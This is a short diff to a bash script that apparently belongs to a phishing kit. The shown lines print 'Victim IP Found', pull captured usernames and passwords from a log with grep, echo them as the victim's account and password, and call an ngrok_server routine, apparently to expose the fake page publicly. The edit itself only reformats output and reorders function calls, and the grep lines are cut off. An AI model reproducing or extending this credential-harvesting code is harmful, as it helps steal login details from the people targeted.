@@ -240,9 +240,9 @@ echo -e $red Victim IP Found
 account=$(grep -o 'Username:.*' 
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' 
-echo -e $ red Account : $account
-echo -e $red Password: $password
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
+echo -e $ red "Account : $account"
+echo -e $ red "Password: $password"
+echo -e $ red Press Ctrl + C to Exit
 fi
 sleep 0.75
 
@@ -250,6 +250,7 @@ done
 
 }
 
-dependencies
+
 tools
+dependencies
 ngrok_server
